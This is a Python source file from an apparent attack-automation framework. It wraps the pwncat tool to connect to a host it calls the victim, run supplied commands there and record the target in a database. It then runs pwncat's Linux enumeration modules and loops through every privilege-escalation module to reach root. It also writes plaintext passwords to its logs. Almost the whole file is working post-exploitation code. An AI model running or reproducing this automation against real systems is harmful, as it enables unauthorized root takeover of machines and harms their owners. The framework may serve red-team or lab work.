import logging

import pwncat
import shlex
try:
    from pwncat.modules import BaseModule
    from pwncat.privesc import PrivescError
except:
    pass

from diamondback.support import get_mac
from diamondback.action import Action,call_before_decorator
from diamondback.domain import *
from diamondback.connection.pwncat import PwncatConnection

class PwncatSession( Action ):
    """
    """
    def __init__( self, *args, **kwargs ):
        super().__init__( self, *args, **kwargs )
        self.logger = logging.getLogger( 'pwncatconnection' )
        self.logger.info( 'initializing Pwncat Conection action' )

        i = self.get_input( )
        p = self.password
        u = self.username
        self.logger.info( f'using supplied target of {i}, username of {u}, password of {p}' )
    
        self.command = ""

        if 'manager' in kwargs:
            self.manager = kwargs['manager']
            self.logger.info( 'setup PWNCAT manager' )

        if 'command' in kwargs:
            self.original_command = kwargs['command']

            variables = self.variables | kwargs

            self.command = self.original_command.format( **variables )
    
    def __del__( self ):
        self.logger.info( "pwncatsession breakdown" )

        self.get_connection().close( )

        self.logger.info( "closed.." )

    def automate_privesc( self, session, target_user="root" ):
        """
        Attempts to run all applicable privilege escalation modules
        to reach the target user within an active pwncat session.
        """
        attempted_modules = []
        attempted_users   = []

        # Iterate through all available escalation modules
        for module in session.find_module("escalate/.*"):
            if module in attempted_modules:
                continue
            try:
                self.logger.info( f"attempting escalation with: {module.name}" )
                # The run method of the module handles the exploitation logic
                module.run( user=target_user, ignore_users=attempted_users, ignore_modules=attempted_modules, session=session )
                self.logger.info( f"Successfully escalated to {target_user}!" )
                break
            except PrivescError as e:
                self.logger.error(f"Module {module.name} failed: {e}")
            finally:
                attempted_modules.append(module)

    def execute_command( self ):
        """
        Execute commands on a remote host using pwncat session
        """
        host = self.get_input()
        try:
            self.logger.info(f"[{host}] Successfully connected, executing: {self.command}")

            c = self.lookup_command( self.command, 'ssh' )
            if not c:
                new_command         = Command( )
                new_command.service = self.get_connection_type()
                new_command.value   = self.command
                new_command.name    = self.command.split(" ")[0]

                self.session.add( new_command )
                self.session.commit( )

            r = self.get_connection().execute( self.command, sudo=self.sudo )
            self.logger.info( 'execution completed...' )
            if r['out']:
                self.logger.info(f"[{host}] Output:{r['out'][:200]}")  # Limit output length
            if r['err']:
                self.logger.error(f"[{host}] Error: {r['err']}")
        except Exception as e:
            self.logger.error(f"[{host}] Error: {str(e)}")

    def run( self ):
        self.connection = PwncatConnection( self.get_input(), self.username, self.password, self.key )
        self.connection.set_manager( self.manager )
        self.connection.open( )
        self.logger.info( 'opened pwncat connection to vicim' )
        
        if self.does_host_exist(self.get_input()):
            host_record = self.lookup_host_by_address( self.get_input() )
            self.logger.info( f"found target {host_record.id}" )
        else:
            self.logger.info( f'target record did not exist, save new one for {self.get_input()}' )
            host_record                  = Target( )
            host_record.address          = self.get_input( )
            host_record.hardware_address = get_mac( self.get_input() )
            host_record.victim           = self.victim
            host_record.discovery_method = self.__class__.__name__
            host_record.connection       = "pwncat"
            self.session.add( host_record )
            self.session.commit( )

        if self.command:
            self.logger.info( "execute supplied command(s) via pwncat connection" )
            self.execute_command( )
            self.logger.debug( "finished command execution" )

        # List available escalation modules
        self.logger.info("[*] Listing available PWNCAT escalation modules...\n")
        session = self.get_connection().get_client()
        modules = session.find_module( '*linux.*' )

        MODULES_TO_SKIP =   [
                                'linux.enumerate.escalate.leak_privkey'
                            ]

        for m in modules:
            if m.name not in MODULES_TO_SKIP:
                self.logger.info( f"running {m.name}" )
                try:
                    module_result = m.run( session=session )
                except:
                    pass
                for r in module_result:
                    try:
                        self.logger.info( r.title() )

                        facts = session.facts
                        for f in facts:
                            self.logger.info( f.title() )  
                    except:
                        pass
                self.logger.info( "finished" )

        self.automate_privesc( session )

        self.logger.info( 'pwncat connection action completed....' )
        return self

